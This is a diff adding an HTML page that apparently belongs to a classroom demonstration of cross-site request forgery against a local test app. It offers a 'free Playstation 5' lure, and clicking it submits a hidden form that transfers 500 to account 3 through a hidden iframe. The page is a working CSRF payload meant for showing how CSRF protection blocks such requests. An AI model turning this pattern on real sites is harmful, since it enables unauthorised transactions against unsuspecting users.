@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Malicious website</title>
+    </head>
+    <body>
+        <h1>This is a malicious website</h1>
+        <h3>
+            This is an example of a malicious website. When the user clicks on the button below, a CSRF attack is attempted.
+        </h3>
+        <form hidden id="attack" target="csrf-frame" action="http://localhost:5000/csrf_homepage" method="POST" autocomplete="off">
+            <input type="number" name="amount" value="500">
+            <input type="number" name="account" value="3">
+        </form>
+        <iframe hidden name="csrf-frame"></iframe>
+
+        <br><br>
+
+        <h4>Click to claim your free Playstation 5!</h4>
+        <button onClick="perform_csrf_attack();" id="button">Click to claim</button>
+        <br>
+        <h2 id="alert"></h2>
+
+        <script>
+            const alert = "An attack attempt was just made.\
+                If CSRF protection is disabled, refresh your app to check your new account balance. \
+                If CSRF protection is enabled, open your console to see an error because the attack was blocked.";
+            function perform_csrf_attack() {
+                document.getElementById("attack").submit();
+                document.getElementById("alert").innerHTML= alert;
+            }
+        </script>
+
+    </body>
+</html>
